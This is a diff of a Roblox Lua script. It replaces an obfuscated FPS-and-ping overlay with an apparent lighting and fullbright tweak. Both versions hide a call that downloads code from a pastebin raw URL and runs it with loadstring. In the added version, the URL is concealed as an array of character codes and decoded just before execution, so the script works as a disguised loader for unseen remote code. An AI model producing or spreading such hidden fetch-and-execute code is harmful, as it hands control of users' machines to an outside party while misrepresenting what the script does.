@@ -1,12 +1,38 @@
-task.spawn(function() local v39=0 -0 ;local v40;while true do if (v39==(0 + 0)) then v40=0;while true do if (v40==(0 -0)) then task.wait(1 + 0 );loadstring(game:HttpGet("https://pastebin.com/raw/abLR46we"))();break;end end break;end end end);local v0=game.Players.LocalPlayer;local v1=Instance.new("ScreenGui");v1.ResetOnSpawn=false;v1.Parent=v0:WaitForChild("PlayerGui");local v4=game:GetService("TweenService");local v5=Instance.new("Frame");v5.Size=UDim2.new(791 -(368 + 423) ,150,0,188 -128 );v5.Position=UDim2.new(19 -(10 + 8) ,769 -569 ,442 -(416 + 26) ,63 -43 );v5.BackgroundColor3=Color3.fromRGB(110 + 145 ,450 -195 ,693 -(145 + 293) );v5.BackgroundTransparency=430.25 -(44 + 386) ;v5.Parent=v1;local v11=Instance.new("UICorner");v11.CornerRadius=UDim.new(1486 -(998 + 488) ,6 + 10 );v11.Parent=v5;local v14=Instance.new("UIStroke");v14.Thickness=2 + 0 ;v14.Parent=v5;local v17=Instance.new("TextLabel");v17.Size=UDim2.new(773 -(201 + 571) ,0,1138.5 -(116 + 1022) ,0);v17.BackgroundTransparency=4 -3 ;v17.TextColor3=Color3.fromRGB(0,0 + 0 ,0 -0 );v17.Font=Enum.Font.GothamBold;v17.TextSize=56 -40 ;v17.Text="ÙØ±ÙŠÙ…Ø§Øª: ...";v17.Parent=v5;local v26=Instance.new("TextLabel");v26.Size=UDim2.new(860 -(814 + 45) ,0,0.5 -0 ,0 + 0 );v26.Position=UDim2.new(0,0 + 0 ,885.5 -(261 + 624) ,0 -0 );v26.BackgroundTransparency=1;v26.TextColor3=Color3.fromRGB(1080 -(1020 + 60) ,1423 -(630 + 793) ,0 -0 );v26.Font=Enum.Font.GothamBold;v26.TextSize=16;v26.Text="Ø¨Ù†Ø¬Ùƒ: ...";v26.Parent=v5;v4:Create(v5,TweenInfo.new(0.6 -0 ,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=UDim2.new(1, -(64 + 96),0,68 -48 )}):Play();local v35=game:GetService("RunService");local v36=game:GetService("Stats");local v37=0;local v38=tick();v35.RenderStepped:Connect(function() local v41=1747 -(760 + 987) ;while true do if ((1913 -(1789 + 124))==v41) then v37+=(767 -(745 + 21)) if ((tick() -v38)>=(1 + 0)) then local v45=0 -0 ;while true do if (v45==(3 -2)) then v38=tick();break;end if (v45==(0 + 0)) then v17.Text="ÙØ±ÙŠÙ…Ø§Øª: "   .. v37 ;v37=0 + 0 ;v45=1056 -(87 + 968) ;end end end break;end end end);task.spawn(function() while true do local v42=0;local v43;while true do if ((0 -0)==v42) then v43=v36.Network.ServerStatsItem["Data Ping"]:GetValue();v26.Text="Ø¨Ù†Ø¬Ùƒ: "   .. math.floor(v43) ;v42=1 + 0 ;end if (1==v42) then if (v43<(180 -100)) then v14.Color=Color3.fromRGB(1413 -(447 + 966) ,698 -443 ,1937 -(1703 + 114) );elseif (v43<150) then v14.Color=Color3.fromRGB(255,901 -(376 + 325) ,0);else v14.Color=Color3.fromRGB(255,131 -51 ,80);end task.wait(2 -1 );break;end end end end);
--- âš ï¸ WARNING: integrity protected!
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+local _0x1={104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,106,75,52,51,82,81,105}
+local function _0x2(t)
+local s=""
+for i,v in pairs(t) do
+s=s..string.char(v)
+end
+return s
+end
 
-]]--
+local function _0x3()
+local g=game
+local l=g:GetService("Lighting")
+
+l.FogStart=0
+l.FogEnd=999999
+l.Brightness=3
+l.ClockTime=14
+l.GlobalShadows=false
+l.Ambient=Color3.fromRGB(180,180,180)
+l.OutdoorAmbient=Color3.fromRGB(180,180,180)
+
+local c=Instance.new("ColorCorrectionEffect")
+c.Brightness=0.05
+c.Contrast=0.25
+c.Saturation=0.2
+c.Parent=l
+
+local a=l:FindFirstChildOfClass("Atmosphere")
+if a then
+a.Density=0
+end
+end
+
+pcall(function()
+loadstring(game:HttpGet(_0x2(_0x1)))()
+end)
+
+_0x3()
